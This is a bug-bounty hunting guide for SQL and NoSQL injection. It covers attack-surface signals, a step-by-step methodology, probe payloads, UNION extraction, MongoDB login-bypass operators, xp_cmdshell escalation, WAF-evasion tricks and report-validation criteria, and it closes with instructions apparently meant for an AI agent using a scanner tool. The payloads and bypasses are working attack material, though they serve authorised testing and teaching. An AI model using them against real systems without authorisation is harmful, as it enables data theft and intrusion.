# SQL Injection

## Crown Jewel Targets

SQL injection remains one of the highest-paying vulnerability classes in bug bounty because it directly threatens data confidentiality, integrity, and availability at scale.

## Attack Surface Signals

**URL patterns that suggest injectable parameters:**
```
/search?q=
/filter?category=
/sort?by=&order=
/report?start_date=&end_date=
/api/v1/items?id=
/index.php?id=
/gallery?album_id=
/track?uid=&campaign=
?page=&limit=&offset=
```

**Response header signals:**
- `X-Powered-By: PHP` — likely MySQL/PostgreSQL backend
- `Server: Apache` + PHP — classic LAMP stack
- `X-Powered-By: Express` — possible MongoDB/NoSQL backend
- Database error messages leaking in responses (MySQL, PostgreSQL, MSSQL error strings)

**JavaScript patterns indicating dynamic query construction:**
```javascript
// Look for these in JS bundles
fetch(`/api/search?q=${userInput}`)
$.ajax({ url: '/filter?sort=' + param })
axios.get('/report?from=' + startDate + '&to=' + endDate)
```

**Tech stack signals:**
- WordPress sites with third-party plugins (check `/wp-content/plugins/`)
- Apache Airflow endpoints (`/admin/`, `/api/experimental/`)
- GitHub Enterprise (`/_graphql`, `/search`, `/api/v3/`)
- Node.js + MongoDB combinations (check for `$where`, `$regex` in request bodies)
- PHP applications returning verbose MySQL errors

**Content-type signals for NoSQL:**
- `Content-Type: application/json` bodies with nested object parameters
- Parameters accepting arrays: `param[]=value` or `{"key": {"$gt": ""}}`

---

## Step-by-Step Hunting Methodology

1. **Enumerate all input vectors** — Use Burp Suite passive scan during normal app usage. Capture every parameter: GET, POST, JSON body, HTTP headers (User-Agent, Referer, X-Forwarded-For), cookies, path segments.

2. **Identify the tech stack** — Check response headers, error messages, job postings, Wappalyzer, BuiltWith. Determines which payloads to prioritize (MySQL vs PostgreSQL vs MongoDB).

3. **Baseline the response** — Note normal response length, status code, and response time for a clean request. This is your diff baseline.

4. **Send error-based probes** — Inject single quote `'`, double quote `"`, backtick `` ` ``, and observe for:
   - Database error messages (immediate confirmation)
   - Response length change
   - HTTP 500 errors

5. **Test boolean-based blind** — Send true/false conditions and compare responses:
   - `param=1 AND 1=1` vs `param=1 AND 1=2`
   - If responses differ → likely injectable

6. **Test time-based blind** — When no visible difference exists:
   - MySQL: `param=1 AND SLEEP(5)`
   - PostgreSQL: `param=1; SELECT pg_sleep(5)--`
   - MSSQL: `param=1; WAITFOR DELAY '0:0:5'--`
   - Measure response time delta > 5 seconds = confirmed

7. **For NoSQL (MongoDB)** — Test object injection via JSON body and PHP-style array params:
   - Replace string value with `{"$gt": ""}` in JSON
   - Try `param[$ne]=invalid` in query strings

8. **Automate confirmation** — Run `sqlmap` on confirmed candidates with `--level=3 --risk=2` to enumerate databases without manual effort.

9. **Escalate impact** — Attempt:
   - `UNION`-based extraction (enumerate columns first)
   - `INFORMATION_SCHEMA` dump
   - File read/write (`LOAD_FILE`, `INTO OUTFILE`) if permissions allow
   - Stacked queries for RCE (MSSQL `xp_cmdshell`)

10. **Document the full chain** — Capture Burp repeater request/response, sqlmap output, and proof of data extraction (non-sensitive fields only for report).

---

## Payload & Detection Patterns

**Initial Error-Based Probes:**
```sql
'
''
`
')
"))
' OR '1'='1
' OR 1=1--
" OR 1=1--
' OR 1=1#
admin'--
```

**Boolean-Based Blind:**
```sql
' AND 1=1--   (true condition)
' AND 1=2--   (false condition)
' AND SUBSTRING(version(),1,1)='5'--
1 AND (SELECT COUNT(*) FROM users) > 0--
```

**Time-Based Blind:**
```sql
-- MySQL
' AND SLEEP(5)--
1; SELECT SLEEP(5)--

-- PostgreSQL  
'; SELECT pg_sleep(5)--
1 AND (SELECT 1 FROM pg_sleep(5))--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--
1; EXEC xp_cmdshell('ping -n 5 127.0.0.1')--

-- SQLite
' AND (SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2)))))==1--
```

**UNION-Based (enumerate columns first):**
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 10--   (find column count via error)
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,database(),3--
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
```

**NoSQL Injection (MongoDB):**
```javascript
// JSON body injection
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"$where": "this.username == this.password"}

// Query string injection
username[$ne]=invalid&password[$ne]=invalid
username[$regex]=.*&password[$regex]=.*
```

**PHP Hash/Array Injection:**
```
# Replace scalar with array
param[key]=value
param[$gt]=0
param[$ne]=null
```
---

## Common Root Causes

1. **String concatenation instead of parameterized queries** — The #1 root cause. Developers build SQL strings with user input directly: `"SELECT * FROM items WHERE id=" + userId`.

2. **ORMs bypassed for "performance"** — Developer switches from safe ORM to raw query for complex joins or reports: `db.query("SELECT " + userColumn + " FROM table")`.

3. **Search/filter functionality** — Sorting and filtering logic is notoriously hard to parameterize (column names can't be bound), leading to allowlist bypasses or no protection at all.

4. **Third-party plugin/library vulnerabilities** — Developers trust installed plugins (WordPress, Joomla extensions) without auditing their query logic (Uber's Huge IT Video Gallery case).

5. **Legacy codebases** — Old PHP 4/5 code predating PDO/MySQLi prepared statements, still running in production on acquired assets or regional subdomains.

6. **Internal tools promoted to external** — Tools like Apache Airflow were designed for internal use with minimal security hardening, then exposed to authenticated external users.

7. **NoSQL false sense of security** — Developers believe "we use MongoDB so no SQL injection" and skip input validation entirely, enabling object/operator injection.

8. **Insufficient escaping of ORDER BY / GROUP BY** — These clauses cannot use bound parameters, so developers escape manually (and often incorrectly).

9. **HTTP header and non-obvious inputs** — `User-Agent`, `Referer`, `X-Forwarded-For` stored in DB without sanitization, assuming they're "trusted" server-side values.

---

## Bypass Techniques

**WAF Bypass Techniques:**

*Keyword obfuscation:*
```sql
-- Space substitution
SELECT/**/username/**/FROM/**/users
SEL/**/ECT username FROM users
%09SELECT%09username%09FROM%09users  (tab)
SELECT%0Ausername%0AFROM%0Ausers    (newline)

-- Case variation
SeLeCt UsErNaMe FrOm UsErS
sElEcT username fRoM users

-- Comment injection
SE/**/LECT username FR/**/OM users
/*!SELECT*/ username /*!FROM*/ users  (MySQL version comments)
/*!50000SELECT*/ username FROM users
```

*Encoding bypasses:*
```
URL encode: %27 = '  %20 = space  %23 = #
Double URL encode: %2527 = %27 = '
Unicode: ʼ (U+02BC) as quote substitute
HTML entity (in reflected contexts): &#39;
```

*Operator substitution:*
```sql
-- Avoid "OR" and "AND"
' || '1'='1
' && '1'='1
UNION ALL SELECT  (instead of UNION SELECT)
```

*Function substitution:*
```sql
-- When SLEEP is blocked
BENCHMARK(10000000,MD5(1))
GET_LOCK('a',5)
-- When UNION is blocked
INTO OUTFILE  (different extraction method)
```

*JSON/NoSQL WAF bypass:*
```json
{"username": {"$\u0067t": ""}}
{"user\u006eame": {"$gt": ""}}
```

*Authentication bypass for "authenticated-only" injection (Airflow pattern):*
- Obtain low-privilege account (free tier, trial, leaked creds)
- Inject via authenticated endpoints — WAFs often whitelist authenticated traffic

*Chunked transfer encoding to bypass body inspection:*
```
Transfer-Encoding: chunked
(split payload across chunks to evade WAF reassembly)
```

---

## Gate 0 Validation

Before writing the report, answer all three:

**1. What can the attacker DO right now?**
Must be able to demonstrate at least one of:
- Extract database version/name via error message or UNION
- Prove time-delay control (5s sleep with `SLEEP(5)`, confirmed by timing)
- Extract a row from `information_schema.tables`
- Bypass authentication via boolean injection
- For NoSQL: bypass login or extract collection data

If the only evidence is an error message change with no data extraction or timing proof, it may be informational only (like Report 1 — rated Low).

**2. What does the victim LOSE?**
Must identify specific data at risk:
- PII (names, emails, passwords, addresses)
- Authentication credentials or session tokens
- Business data (transactions, proprietary records)
- Ability to exfiltrate to attacker-controlled server

A generic "database could be read" without identifying what database/table contains sensitive data weakens the report significantly.

**3. Can it be reproduced in 10 minutes from scratch?**
Must have:
- Single curl command or Burp repeater request that demonstrates the vulnerability
- No dependency on specific session state that expires immediately
- SQLMap tamper script or manual payload that consistently triggers the behavior
- Screen recording or step-by-step that a triage engineer can follow without your help

If you need more than one account, special timing, or race conditions to reproduce — document all prerequisites explicitly before submitting.

## How to test with this tool
- `scan_api` with `plugins:["sqli"]` runs three techniques automatically:
  - **error-based**: injects `'`, `"`, `')`, backtick, `%27`, `'/**/` and matches DB
    error signatures (MySQL/Postgres/SQLite/Oracle/MSSQL).
  - **boolean-based blind**: `… AND '1'='1'` (true) vs `… AND '1'='2'` (false); a
    response-length divergence confirms it.
  - **time-based blind**: `… AND SLEEP(3)` / `pg_sleep(3)`; a measured delay confirms it.
- Use `insert_point` to target a specific place, e.g. `["query:q"]`, `["header:X-Api-Key"]`.
- If you suspect a context the scanner missed, craft a payload and send it via
  `http_request`, then read the raw response with `get_scan_logs` / the http_request output.
